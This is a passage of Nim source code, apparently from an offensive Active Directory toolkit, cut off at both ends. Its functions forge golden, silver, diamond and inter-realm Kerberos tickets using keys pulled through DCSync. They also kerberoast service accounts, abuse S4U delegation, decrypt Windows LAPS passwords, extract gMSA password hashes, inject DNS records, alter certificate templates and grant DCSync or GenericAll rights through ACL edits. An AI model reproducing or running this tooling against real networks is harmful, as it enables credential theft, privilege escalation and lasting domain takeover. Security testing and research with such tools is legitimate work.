  if principal.contains("@"):
    let parts = principal.split("@", 1)
    let realm =
      if config.domain.len > 0: config.domain.toUpperAscii()
      else: parts[1].toUpperAscii()
    principal = parts[0] & "@" & realm
  if principal.len == 0:
    return %*{"protocol": "ldap", "operation": "adcs-auth", "host": host,
      "success": false, "message": "--adcs-auth requires --upn or -u/-d"}
  var identity = ""
  if config.ldapAdcsPfx.len > 0:
    identity = "PKCS12:" & config.ldapAdcsPfx
  elif config.ldapCertFile.len > 0 and config.ldapAdcsKey.len > 0:
    identity = "FILE:" & config.ldapCertFile & "," & config.ldapAdcsKey
  else:
    return %*{"protocol": "ldap", "operation": "adcs-auth", "host": host,
      "success": false, "message": "--adcs-auth requires --pfx or --cert plus --key"}
  let ccache =
    if config.ldapAdcsCcache.len > 0: config.ldapAdcsCcache
    elif config.ccachePath.len > 0: config.ccachePath
    elif config.ldapAdcsOut.len > 0: config.ldapAdcsOut & ".ccache"
    else: getCurrentDir() / (principal.split("@")[0] & ".ccache")
  let (krb5ConfigPath, caPemPath) =
    try:
      waitFor preparePkinitConfig(host, principal, config)
    except CatchableError as error:
      return %*{"protocol": "ldap", "operation": "adcs-auth", "host": host,
        "success": false, "principal": principal, "identity": identity,
        "ccache": ccache, "message": "PKINIT bootstrap failed: " & error.msg}
  let r = pkinitmod.pkinitGetTgt(principal, identity, ccache, config.password,
    krb5Config=krb5ConfigPath)
  %*{"protocol": "ldap", "operation": "adcs-auth", "host": host,
    "success": r.success, "principal": r.principal, "identity": r.identity,
    "ccache": r.ccache, "krb5_config": krb5ConfigPath, "ca_pem": caPemPath,
    "message": r.message}

proc runKrb5Conf(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0:
    raise newException(ValueError, "krb5conf requires a KDC host target")
  if targets.len > 1:
    raise newException(ValueError, "krb5conf expects exactly one KDC host")
  let domain = config.domain.strip()
  if domain.len == 0:
    raise newException(ValueError, "krb5conf requires -d/--domain")
  let realm =
    if config.krb5Realm.len > 0: config.krb5Realm.strip().toUpperAscii()
    else: domain.toUpperAscii()
  let outPath =
    if config.krb5Out.len > 0: config.krb5Out
    else: getCurrentDir() / "krb5.conf"
  let content = buildPkinitKrb5Config(realm, domain, targets[0], config.krb5CaPath)
  let parent = parentDir(outPath)
  if parent.len > 0:
    createDir(parent)
  writeFile(outPath, content)
  if config.jsonOutput:
    echo $(%*{
      "protocol": "krb5conf",
      "success": true,
      "path": outPath,
      "realm": realm,
      "domain": domain,
      "kdc": targets[0],
      "ca_pem": config.krb5CaPath
    })
  else:
    echo "krb5 config written: " & outPath
    echo "export KRB5_CONFIG=" & outPath

proc kerberosProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let realm =
    if config.krb5Realm.len > 0: config.krb5Realm.strip().toUpperAscii()
    elif config.domain.len > 0: config.domain.strip().toUpperAscii()
    elif config.username.contains("@"): config.username.split("@", 1)[1].strip().toUpperAscii()
    else: host.toUpperAscii()
  let domain =
    if config.domain.len > 0: config.domain
    else: realm.toLowerAscii()
  let op =
    if config.krb5Request.len > 0: config.krb5Request
    elif config.krb5Forge.len > 0: "forge-" & config.krb5Forge
    elif config.remoteCommand.len > 0: config.remoteCommand.toLowerAscii()
    else: "kinit"
  let outPath =
    if config.krb5Out.len > 0: config.krb5Out
    elif config.ccachePath.len > 0: config.ccachePath
    else:
      getCurrentDir() / (if op in ["getst", "st", "tgs"]: "nimux-st.ccache" else: "nimux.ccache")

  if config.krb5Forge.len > 0:
    let targetAccount =
      if config.krb5Forge in ["golden", "diamond"]: "krbtgt"
      elif config.ldapUser.len > 0: config.ldapUser
      elif config.krb5Service.len > 0 and config.krb5Service.contains("/"):
        config.krb5Service.split("/")[1].split(".")[0] & "$"
      elif config.ldapSpn.len > 0 and config.ldapSpn.contains("/"):
        config.ldapSpn.split("/")[1].split(".")[0] & "$"
      else: ""
    var keyNode = newJObject()
    var syncOk = false
    var forgeKey = ""
    var syncDomainSid = ""
    var kdcKeyHex = ""
    if config.krb5Key.len > 0:
      forgeKey = config.krb5Key
      syncOk = true
      keyNode["key_source"] = %"cli"
      keyNode["nt_hash"] = %forgeKey
    elif config.krb5AesKey.len > 0:
      forgeKey = config.krb5AesKey
      syncOk = true
      keyNode["key_source"] = %"cli-aes"
      keyNode["aes256_key"] = %forgeKey
    if forgeKey.len == 0 and targetAccount.len > 0 and
        (config.ntlmHash.len > 0 or config.password.len > 0 or config.kerberos):
      try:
        let sync = await dcsyncmod.dcSync(host, if config.port > 0: config.port else: 445,
          max(config.timeoutMs, 10000),
          config.username, config.password, config.ntlmHash, domain,
          targetAccount, kerberos = config.kerberos)
        if sync.accounts.len > 0:
          let acct = sync.accounts[0]
          syncOk = acct.ntHash.len > 0 or acct.kerberosKeys.len > 0
          syncDomainSid = acct.domainSid
          keyNode["account"] = %acct.username
          keyNode["rid"] = %acct.rid
          if acct.domainSid.len > 0: keyNode["domain_sid"] = %acct.domainSid
          if acct.ntHash.len > 0:
            forgeKey = dcsyncmod.toHexStr(acct.ntHash)
            keyNode["nt_hash"] = %forgeKey
          var aes256Key = ""
          var karr = newJArray()
          for k in acct.kerberosKeys:
            let keyHex = dcsyncmod.toHexStr(k.keyData)
            karr.add %*{"type": dcsyncmod.kerberosTypeName(k.keyType),
              "key": keyHex}
            if k.keyType == 18 and keyHex.len == 64:
              aes256Key = keyHex
          keyNode["kerberos_keys"] = karr
          if config.krb5Key.len == 0 and aes256Key.len > 0:
            forgeKey = aes256Key
            keyNode["selected_key"] = %"aes256"
        else:
          keyNode["error"] = %(if sync.error.len > 0: sync.error else: sync.message)
      except CatchableError as error:
        keyNode["error"] = %error.msg.splitLines()[0]
    if config.krb5KdcKey.len > 0:
      kdcKeyHex = config.krb5KdcKey
    elif config.krb5AesKey.len > 0:
      kdcKeyHex = config.krb5AesKey
    elif syncOk and forgeKey.len > 0 and config.krb5Forge == "silver":
      let knownSid = if config.krb5Sid.len > 0: config.krb5Sid
                     elif syncDomainSid.len > 0: syncDomainSid
                     else: ""
      let krbtgtTarget = if knownSid.len > 0: knownSid & "-502" else: "krbtgt"
      try:
        let kdcSync = await dcsyncmod.dcSync(host, if config.port > 0: config.port else: 445,
          max(config.timeoutMs, 10000),
          config.username, config.password, config.ntlmHash, domain,
          krbtgtTarget, kerberos = config.kerberos)
        if kdcSync.accounts.len > 0:
          var kdcAes256 = ""
          for k in kdcSync.accounts[0].kerberosKeys:
            let keyHex = dcsyncmod.toHexStr(k.keyData)
            if k.keyType == 18 and keyHex.len == 64:
              kdcAes256 = keyHex
          if forgeKey.len == 64 and kdcAes256.len > 0:
            kdcKeyHex = kdcAes256
            keyNode["kdc_aes256_key"] = %kdcKeyHex
          elif kdcSync.accounts[0].ntHash.len > 0:
            kdcKeyHex = dcsyncmod.toHexStr(kdcSync.accounts[0].ntHash)
            keyNode["kdc_nt_hash"] = %kdcKeyHex
      except CatchableError: discard
    if kdcKeyHex.len > 0:
      if kdcKeyHex.len == 64:
        keyNode["kdc_aes256_key"] = %kdcKeyHex
      else:
        keyNode["kdc_nt_hash"] = %kdcKeyHex
    if syncOk and forgeKey.len > 0:
      var diamondCache = tgsmod.TicketRequestResult()
      var diamondUser = ""
      if config.krb5Forge == "diamond":
        diamondCache = tgsmod.ccachePrincipal(config.ccachePath)
        if not diamondCache.success:
          return %*{
            "protocol": "kerberos", "host": host, "port": 88,
            "operation": op, "success": false, "authenticated": false,
            "key_acquired": true, "key_material": keyNode,
            "message": "diamond requires a readable source TGT ccache: " & diamondCache.message
          }
        diamondUser = diamondCache.principal
        if diamondUser.contains("@"):
          diamondUser = diamondUser.split("@")[0]
        if diamondUser.contains("/"):
          diamondUser = diamondUser.split("/")[0]
      let forgedUser =
        if config.krb5Forge == "diamond": diamondUser
        elif config.ldapUser.len > 0 and config.krb5Forge in ["golden", "inter-realm"]: config.ldapUser
        elif config.krb5Forge in ["golden", "inter-realm"] and config.username.len > 0: config.username
        else:
          if config.username.len > 0: config.username else: "administrator"
      let service =
        if config.krb5Forge in ["golden", "diamond"]: "krbtgt/" & realm
        elif config.krb5Forge == "inter-realm":
          let tgtRealm =
            if config.krb5TargetRealm.len > 0: config.krb5TargetRealm.toUpperAscii()
            else: realm
          "krbtgt/" & tgtRealm
        elif config.ldapSpn.len > 0: config.ldapSpn
        elif config.krb5Service.len > 0: config.krb5Service
        else: ""
      let outPath =
        if config.krb5Out.len > 0: config.krb5Out
        elif config.ccachePath.len > 0 and config.krb5Forge != "diamond": config.ccachePath
        else: getCurrentDir() / ("nimux-" & config.krb5Forge & ".ccache")
      let effectiveSid =
        if config.krb5Sid.len > 0: config.krb5Sid
        elif syncDomainSid.len > 0: syncDomainSid
        else: ""
      let effectiveRid =
        if config.krb5Rid != 500'u32 or config.krb5Sid.len > 0: config.krb5Rid
        else: 500'u32
      let forged = tgsmod.forgeRc4Ccache(realm, forgedUser, service, forgeKey,
        outPath, config.krb5DurationHours, effectiveSid, effectiveRid, config.krb5Groups,
        kdcKeyHex, config.krb5StartOffsetMinutes, config.krb5ExtraSids)
      return %*{
        "protocol": "kerberos", "host": host, "port": 88,
        "operation": op, "success": forged.success, "authenticated": forged.success,
        "principal": forged.principal, "service": forged.service,
        "ccache": forged.ccache, "key_acquired": true, "key_material": keyNode,
        "source_ccache": diamondCache.ccache,
        "domain_sid": effectiveSid, "message": forged.message
      }
    return %*{
      "protocol": "kerberos", "host": host, "port": 88,
      "operation": op, "success": false, "authenticated": false,
      "key_acquired": syncOk, "key_material": keyNode,
      "message": "forge key acquired via native DCSync; run again with --sid to include PAC"
    }

  case op
  of "ccache", "describe", "list", "tickets":
    let r = tgsmod.describeCcache(config.ccachePath)
    var entries = newJArray()
    for e in r.entries:
      entries.add %*{
        "client": e.client,
        "server": e.server,
        "enctype": e.enctype,
        "start_time": e.startTime,
        "end_time": e.endTime,
        "renew_till": e.renewTill,
        "flags": e.flags,
        "ticket_len": e.ticketLen
      }
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": r.operation, "success": r.success, "authenticated": r.success,
      "principal": r.principal, "ccache": r.ccache, "entries": entries,
      "message": r.message}
  of "purge":
    let r = tgsmod.purgeCcache(config.ccachePath)
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": r.operation, "success": r.success, "authenticated": false,
      "ccache": r.ccache, "message": r.message}
  of "renew":
    let r = tgsmod.renewCcache(config.ccachePath)
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": r.operation, "success": r.success, "authenticated": r.success,
      "principal": r.principal, "ccache": r.ccache, "message": r.message}
  of "ccache-to-kirbi", "tokirbi", "kirbi-export":
    let kirbiOut =
      if config.krb5Kirbi.len > 0: config.krb5Kirbi
      elif config.krb5Out.len > 0: config.krb5Out
      else: ""
    let r = tgsmod.ccacheToKirbi(config.ccachePath, kirbiOut)
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": r.operation, "success": r.success, "authenticated": r.success,
      "principal": r.principal, "ccache": r.input, "kirbi": r.output,
      "ticket_count": r.ticketCount, "message": r.message}
  of "kirbi-to-ccache", "fromkirbi", "kirbi-import":
    let ccacheOut =
      if config.krb5Out.len > 0: config.krb5Out
      elif config.ccachePath.len > 0: config.ccachePath
      else: ""
    let r = tgsmod.kirbiToCcache(config.krb5Kirbi, ccacheOut)
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": r.operation, "success": r.success, "authenticated": r.success,
      "principal": r.principal, "ccache": r.output, "kirbi": r.input,
      "ticket_count": r.ticketCount, "message": r.message}
  of "kinit", "asktgt", "tgt":
    let r = tgsmod.requestTicketCcache(host, realm, domain, config.username,
      config.password, config.ntlmHash, "", outPath, false, max(config.timeoutMs, 5000))
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": "kinit", "success": r.success, "authenticated": r.success,
      "principal": r.principal, "ccache": r.ccache, "message": r.message}
  of "getst", "st", "tgs":
    let service =
      if config.ldapSpn.len > 0: config.ldapSpn
      elif config.krb5Service.len > 0: config.krb5Service
      else: ""
    let r = tgsmod.requestTicketCcache(host, realm, domain, config.username,
      config.password, config.ntlmHash, service, outPath, true,
      max(config.timeoutMs, 5000), config.ccachePath)
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": "getst", "success": r.success, "authenticated": r.success,
      "principal": r.principal, "service": r.service, "ccache": r.ccache,
      "message": r.message}
  of "kerberoast", "roast", "tgs-hash":
    let service =
      if config.ldapSpn.len > 0: config.ldapSpn
      elif config.krb5Service.len > 0: config.krb5Service
      else: ""
    let serviceUser =
      if config.ldapUser.len > 0: config.ldapUser
      elif config.ldapName.len > 0: config.ldapName
      else: ""
    let r = tgsmod.requestTgsHashFromCcache(host, realm, domain,
      config.ccachePath, service, serviceUser, max(config.timeoutMs, 5000))
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": "kerberoast", "success": r.success, "authenticated": r.success,
      "user": r.user, "service": r.spn, "hash": r.hash, "message": r.message}
  of "s4u2self", "s4uself":
    let targetUser =
      if config.ldapUser.len > 0: config.ldapUser
      elif config.ldapName.len > 0: config.ldapName
      else: ""
    let service =
      if config.ldapSpn.len > 0: config.ldapSpn
      elif config.krb5Service.len > 0: config.krb5Service
      else: ""
    let r =
      if service.len > 0:
        tgsmod.requestS4USelfCcache(host, realm, domain, targetUser,
          config.ccachePath, outPath, max(config.timeoutMs, 5000), service)
      else:
        s4umod.s4u2Self(targetUser, config.ccachePath, outPath)
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": "s4u2self", "success": r.success, "authenticated": r.success,
      "principal": r.principal, "service": r.service,
      "ccache": r.ccache, "message": r.message}
  of "s4u", "s4u2proxy", "rbcd", "constrained", "kcd":
    let targetUser =
      if config.ldapUser.len > 0: config.ldapUser
      elif config.ldapName.len > 0: config.ldapName
      else: ""
    let service =
      if config.ldapSpn.len > 0: config.ldapSpn
      elif config.krb5Service.len > 0: config.krb5Service
      else: ""
    let sourceService =
      if config.ldapSpn.len > 0 and config.krb5Service.len > 0: config.krb5Service
      else: ""
    let r = tgsmod.requestS4UProxyCcache(host, realm, domain, targetUser,
      service, config.ccachePath, outPath, max(config.timeoutMs, 5000),
      sourceService, op notin ["constrained", "kcd"], config.krb5AltService)
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": op, "success": r.success, "authenticated": r.success,
      "principal": r.principal, "service": r.service, "ccache": r.ccache,
      "message": r.message}
  else:
    return %*{"protocol": "kerberos", "host": host, "port": 88,
      "operation": op, "success": false, "authenticated": false,
      "message": "unknown kerberos request: " & op}

proc ldapMsLapsDecryptJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let r = await ldapclient.lapsForComputer(
    host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.ntlmHash, config.domain,
    config.computerName, kerberos=config.kerberos)
  var node = ldapLapsJson(r)
  node["operation"] = %"decrypt-mslaps"
  let blob =
    if r.windowsEncryptedPassword.len > 0: r.windowsEncryptedPassword
    else: r.windowsEncryptedDsrmPassword
  let targetAttr =
    if r.windowsEncryptedPassword.len > 0: "msLAPS-EncryptedPassword"
    elif r.windowsEncryptedDsrmPassword.len > 0: "msLAPS-EncryptedDSRMPassword"
    else: ""
  if blob.len == 0:
    node["message"] = %"no encrypted Windows LAPS value returned"
    return node
  if config.ldapMsLapsBlobOut.len > 0:
    writeFile(config.ldapMsLapsBlobOut, blob)
    node["blob_out"] = %config.ldapMsLapsBlobOut
  let decrypted = await dpaping.decryptDpapiNgBlob(blob, host,
    config.username, config.password, config.ntlmHash, config.domain,
    kerberos=config.kerberos)
  node["target_attribute"] = %targetAttr
  node["decrypt_supported"] = %decrypted.ok
  if decrypted.ok:
    node["decrypted"] = %decrypted.plaintext
    try:
      let parsed = parseJson(decrypted.plaintext)
      node["decrypted_json"] = parsed
      if parsed.kind == JObject:
        if parsed.hasKey("p"): node["password"] = parsed["p"]
        if parsed.hasKey("n"): node["account"] = parsed["n"]
        if parsed.hasKey("t"): node["timestamp"] = parsed["t"]
    except CatchableError:
      discard
  else:
    node["decrypted"] = newJNull()
  node["message"] = %decrypted.message
  return node

proc ldapFilterEscapeValue(value: string): string
proc ldapEscapeDcValue(value: string): string
proc parseGmsaManagedPasswordBlob(blob: string): JsonNode
proc dnsRecordA(value: string; ttl: int): string

proc ldapGmsaJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let account =
    if config.ldapGmsaAccount.len > 0: config.ldapGmsaAccount
    elif config.ldapName.len > 0: config.ldapName
    elif config.ldapUser.len > 0: config.ldapUser
    else: config.computerName
  let baseDn = await resolveWriteBaseDn(host, config)
  let filter =
    if account.len == 0:
      "(objectClass=msDS-GroupManagedServiceAccount)"
    else:
      let sam = if account.endsWith("$"): account else: account & "$"
      let escapedAccount = ldapFilterEscapeValue(account)
      let escapedSam = ldapFilterEscapeValue(sam)
      let expectedDn = "CN=" & ldapEscapeDcValue(account.strip(chars = {'$'})) &
        ",CN=Managed Service Accounts," & baseDn
      let escapedDn = ldapFilterEscapeValue(expectedDn)
      if config.ldapBase.len == 0 and not account.contains("="):
        "(distinguishedName=" & escapedDn & ")"
      else:
        "(&(objectClass=msDS-GroupManagedServiceAccount)(|(sAMAccountName=" &
          escapedSam & ")(sAMAccountName=" & escapedAccount & ")(cn=" & escapedAccount &
          ")(name=" & escapedAccount & ")))"
  let searchBase =
    if config.ldapBase.len > 0: config.ldapBase
    else: baseDn
  let probe = await ldapclient.probeLdap(host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.domain, config.ntlmHash,
    ldapclient.LdapQueryOptions(rootDse: true, customBase: searchBase,
      customFilter: filter,
      customAttrs: @["sAMAccountName", "cn", "distinguishedName",
        "msDS-ManagedPassword", "msDS-ManagedPasswordId",
        "msDS-ManagedPasswordInterval", "msDS-GroupMSAMembership"],
      limit: if account.len == 0: (if config.queryLimit > 0: config.queryLimit else: 1000) else: 5),
    kerberos=config.kerberos)
  var entries = newJArray()
  for entry in probe.custom:
    var item = ldapEntryJson(entry)
    if entry.attrs.hasKey("msDS-ManagedPassword") and
        entry.attrs["msDS-ManagedPassword"].len > 0:
      item["managed_password"] = parseGmsaManagedPasswordBlob(
        entry.attrs["msDS-ManagedPassword"][0])
      let mp = item["managed_password"]
      if mp.kind == JObject and mp.hasKey("nt_hash"):
        item["nt_hash"] = mp["nt_hash"]
    if entry.attrs.hasKey("sAMAccountName") and entry.attrs["sAMAccountName"].len > 0:
      item["account"] = %entry.attrs["sAMAccountName"][0]
    if entry.attrs.hasKey("msDS-GroupMSAMembership") and
        entry.attrs["msDS-GroupMSAMembership"].len > 0:
      let parsedSd = ldapclient.parseSecurityDescriptor(entry.attrs["msDS-GroupMSAMembership"][0])
      var trustees = newJArray()
      var seen: seq[string]
      for ace in parsedSd.aces:
        if ace.trusteeSid.len == 0 or ace.trusteeSid in seen:
          continue
        seen.add ace.trusteeSid
        trustees.add %ace.trusteeSid
      item["principals_allowed_to_read_password"] = trustees
    entries.add item
  return %*{"protocol": "ldap", "operation": "get-gmsa", "host": host,
    "port": config.port,
    "authenticated": probe.authenticated, "bind_result_code": probe.bindResultCode,
    "account": account, "base": searchBase, "filter": filter, "entries": entries,
    "count": entries.len, "success": entries.len > 0,
    "message": if entries.len > 0: "gMSA query completed" else: probe.message}

proc ldapDnsRecordJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.ldapDnsZone.len == 0 or config.ldapDnsRecord.len == 0:
    return %*{"protocol": "ldap", "operation": "dns", "host": host,
      "success": false, "message": "--dns-add/--dns-delete/--dns-replace requires --zone and --record"}
  let recordType = if config.ldapDnsType.len > 0: config.ldapDnsType.toUpperAscii() else: "A"
  if recordType != "A":
    return %*{"protocol": "ldap", "operation": "dns", "host": host,
      "success": false, "message": "only A records are implemented for LDAP DNS writes"}
  let baseDn = await resolveWriteBaseDn(host, config)
  let zoneDn = "DC=" & ldapEscapeDcValue(config.ldapDnsZone) &
    ",CN=MicrosoftDNS,DC=DomainDnsZones," & baseDn
  let recordDn = "DC=" & ldapEscapeDcValue(config.ldapDnsRecord) & "," & zoneDn
  var actions: seq[ldapclient.LdapWriteAction]
  let op =
    if config.ldapDnsDelete: "dns-delete"
    elif config.ldapDnsReplace: "dns-replace"
    else: "dns-add"
  if config.ldapDnsDelete:
    actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwDelete, dn: recordDn)
  else:
    if config.ldapDnsData.len == 0:
      return %*{"protocol": "ldap", "operation": op, "host": host,
        "success": false, "message": "--dns-add/--dns-replace requires --data <IPv4>"}
    let dnsValue = dnsRecordA(config.ldapDnsData, config.ldapDnsTtl)
    if config.ldapDnsReplace:
      actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwModify, dn: recordDn,
        mods: @[ldapclient.LdapModification(op: ldapclient.lmoReplace,
          attr: "dnsRecord", values: @[dnsValue])])
    else:
      actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwAdd, dn: recordDn,
        attrs: @[
          (name: "objectClass", values: @["top", "dnsNode"]),
          (name: "dc", values: @[config.ldapDnsRecord]),
          (name: "dnsRecord", values: @[dnsValue])
        ])
  var node = ldapWriteResultJson(await ldapclient.applyLdapActions(
    host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.ntlmHash, config.domain, actions,
    kerberos=config.kerberos))
  node["operation"] = %op
  node["zone"] = %config.ldapDnsZone
  node["record"] = %config.ldapDnsRecord
  node["record_type"] = %recordType
  node["record_dn"] = %recordDn
  if config.ldapDnsData.len > 0: node["data"] = %config.ldapDnsData
  return node

proc ldapAdcsTemplateModifyJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.ldapAdcsTemplate.len == 0 and config.ldapName.len == 0 and config.ldapModifyDn.len == 0:
    return %*{"protocol": "ldap", "operation": "adcs-template", "host": host,
      "success": false, "message": "--adcs-template requires --template, --name, or --dn"}
  if config.ldapAddAttrs.len == 0 and config.ldapReplaceAttrs.len == 0 and config.ldapDeleteAttrs.len == 0:
    return %*{"protocol": "ldap", "operation": "adcs-template", "host": host,
      "success": false, "message": "--adcs-template requires --add/--replace/--delete attr=value"}
  let targetDn =
    if config.ldapModifyDn.len > 0:
      config.ldapModifyDn
    else:
      let configDn = await resolveConfigDn(host, config)
      let name = if config.ldapAdcsTemplate.len > 0: config.ldapAdcsTemplate else: config.ldapName
      "CN=" & ldapEscapeDcValue(name) &
        ",CN=Certificate Templates,CN=Public Key Services,CN=Services," & configDn
  var mods: seq[ldapclient.LdapModification]
  mods.add modsFromAssignments(config.ldapAddAttrs, ldapclient.lmoAdd)
  mods.add modsFromAssignments(config.ldapReplaceAttrs, ldapclient.lmoReplace)
  mods.add modsFromAssignments(config.ldapDeleteAttrs, ldapclient.lmoDelete)
  var node = ldapWriteResultJson(await ldapclient.applyLdapActions(
    host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.ntlmHash, config.domain,
    @[ldapclient.LdapWriteAction(kind: ldapclient.lwModify, dn: targetDn, mods: mods)],
    kerberos=config.kerberos))
  node["operation"] = %"adcs-template"
  node["template_dn"] = %targetDn
  return node

proc ldapAclModifyJson(r: ldapclient.LdapAclModifyResult): JsonNode =
  var rights = newJArray()
  for right in r.rights: rights.add %right
  %*{
    "protocol": "ldap",
    "operation": r.operation,
    "host": r.host,
    "port": r.port,
    "reachable": r.reachable,
    "authenticated": r.authenticated,
    "success": r.success,
    "bind_result_code": r.bindResultCode,
    "bind_diagnostic": r.bindDiagnostic,
    "default_naming_context": r.defaultNamingContext,
    "target": r.target,
    "target_dn": r.targetDn,
    "principal": r.principal,
    "principal_sid": r.principalSid,
    "owner": r.owner,
    "owner_sid": r.ownerSid,
    "rights": rights,
    "mask": "0x" & r.mask.toHex(8),
    "ace_type": r.aceType,
    "ace_flags": r.aceFlags,
    "object_type": r.objectType,
    "inherited_object_type": r.inheritedObjectType,
    "result_code": r.resultCode,
    "diagnostic": r.diagnostic,
    "message": r.message
  }

type
  AclRightSpec = object
    label: string
    rights: seq[string]
    objectType: string
    inheritedObjectType: string

proc cleanRightName(value: string): string =
  value.strip().toLowerAscii().replace("-", "").replace("_", "").replace(" ", "")

proc aclRightSpecs(rights: seq[string]; objectType, inheritedObjectType: string): seq[AclRightSpec] =
  var plain: seq[string]
  for raw in rights:
    case cleanRightName(raw)
    of "dcsync":
      result.add AclRightSpec(label: "DCSync/GetChanges", rights: @["ControlAccess"],
        objectType: "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
      result.add AclRightSpec(label: "DCSync/GetChangesAll", rights: @["ControlAccess"],
        objectType: "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
      result.add AclRightSpec(label: "DCSync/GetChangesInFilteredSet", rights: @["ControlAccess"],
        objectType: "89e95b76-444d-4c62-991a-0facbeda640c")
    of "resetpassword", "forcechangepassword":
      result.add AclRightSpec(label: raw, rights: @["ControlAccess"],
        objectType: "00299570-246d-11d0-a768-00aa006e0529")
    of "writemembers", "addmember":
      result.add AclRightSpec(label: raw, rights: @["WriteProperty"],
        objectType: "bf9679c0-0de6-11d0-a285-00aa003049e2")
    of "writespn", "setspn":
      result.add AclRightSpec(label: raw, rights: @["WriteProperty"],
        objectType: "f3a64788-5306-11d1-a9c5-0000f80367c1")
    of "rbcd", "writerbcd":
      result.add AclRightSpec(label: raw, rights: @["WriteProperty"],
        objectType: "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79")
    of "owns", "takeownership":
      result.add AclRightSpec(label: raw, rights: @["WriteOwner"])
    else:
      plain.add raw
  if plain.len > 0:
    result.add AclRightSpec(label: plain.join(","), rights: plain,
      objectType: objectType, inheritedObjectType: inheritedObjectType)

proc ldapAclSpecsModifyJson(host: string; config: CliConfig; target: string): Future[JsonNode] {.async.} =
  let specs = aclRightSpecs(config.ldapAclRights, config.ldapAclObjectType,
    config.ldapAclInheritedObjectType)
  if config.dryRun:
    var planned = newJArray()
    for spec in specs:
      var rights = newJArray()
      for right in spec.rights: rights.add %right
      planned.add %*{
        "target": target,
        "principal": config.ldapAclPrincipal,
        "operation": if config.ldapAclAdd: "acl-add" else: "acl-remove",
        "rights": rights,
        "template": spec.label,
        "deny": config.ldapAclDeny,
        "ace_flags": config.ldapAclAceFlags,
        "object_type": spec.objectType,
        "inherited_object_type": spec.inheritedObjectType,
        "exact": config.ldapAclExact
      }
    return %*{"protocol": "ldap", "operation": "dry-run",
      "host": host, "success": true, "planned": planned,
      "message": "dry-run only; no LDAP writes sent"}
  var items = newJArray()
  var ok = true
  for spec in specs:
    let r = await ldapclient.modifyAclForObject(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      target, config.ldapAclPrincipal, spec.rights, config.ldapAclAdd,
      config.ldapAclDeny, config.ldapAclAceFlags, spec.objectType,
      spec.inheritedObjectType, config.ldapAclExact, kerberos=config.kerberos)
    var node = ldapAclModifyJson(r)
    node["template"] = %spec.label
    items.add node
    ok = ok and r.success
    if r.success:
      var rightsNode = newJArray()
      for right in spec.rights: rightsNode.add %right
      appendRollbackRecord(config, %*{
        "operation": r.operation,
        "rollback_operation": if config.ldapAclAdd: "acl-remove" else: "acl-add",
        "target": target,
        "principal": config.ldapAclPrincipal,
        "rights": rightsNode,
        "object_type": spec.objectType,
        "inherited_object_type": spec.inheritedObjectType,
        "command": ["ldap", "<dc>", "--acl",
          (if config.ldapAclAdd: "--remove-ace" else: "--add"),
          "--user", target, "--principal", config.ldapAclPrincipal,
          "--rights", spec.rights.join(",")]
      })
  if items.len == 1:
    return items[0]
  return %*{"protocol": "ldap", "operation": "acl-template",
    "host": host, "success": ok, "items": items}

proc gpoDelegateJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let gpo = if config.ldapName.len > 0: config.ldapName else: config.ldapModifyDn
  if gpo.len == 0:
    return %*{"protocol": "ldap", "operation": "gpo-delegate", "host": host,
      "success": false, "message": "--gpo --delegate requires --name <gpo>"}
  if config.ldapAclPrincipal.len == 0:
    return %*{"protocol": "ldap", "operation": "gpo-delegate", "host": host,
      "success": false, "message": "--gpo --delegate requires --principal <account>"}
  var rights = config.ldapAclRights
  if rights.len == 0:
    rights = @["GenericAll"]
  if config.dryRun:
    var planned = newJArray()
    for spec in aclRightSpecs(rights, config.ldapAclObjectType,
        config.ldapAclInheritedObjectType):
      var rightsNode = newJArray()
      for right in spec.rights: rightsNode.add %right
      planned.add %*{"gpo": gpo, "principal": config.ldapAclPrincipal,
        "operation": if config.ldapAclRemove: "remove" else: "add",
        "rights": rightsNode, "template": spec.label,
        "object_type": spec.objectType,
        "inherited_object_type": spec.inheritedObjectType}
    return %*{"protocol": "ldap", "operation": "gpo-delegate",
      "host": host, "success": true, "dry_run": true, "planned": planned,
      "message": "dry-run only; no LDAP writes sent"}
  let info = await ldapclient.gpoInfo(host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.ntlmHash, config.domain, gpo,
    kerberos=config.kerberos)
  if not info.success:
    return %*{"protocol": "ldap", "operation": "gpo-delegate", "host": host,
      "success": false, "authenticated": info.authenticated, "gpo": gpo,
      "message": info.message}
  let specs = aclRightSpecs(rights, config.ldapAclObjectType,
    config.ldapAclInheritedObjectType)
  var items = newJArray()
  var ok = true
  let addAce = not config.ldapAclRemove
  for spec in specs:
    let r = await ldapclient.modifyAclForObject(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      info.dn, config.ldapAclPrincipal, spec.rights, addAce,
      config.ldapAclDeny, config.ldapAclAceFlags, spec.objectType,
      spec.inheritedObjectType, config.ldapAclExact, kerberos=config.kerberos)
    var node = ldapAclModifyJson(r)
    node["template"] = %spec.label
    items.add node
    ok = ok and r.success
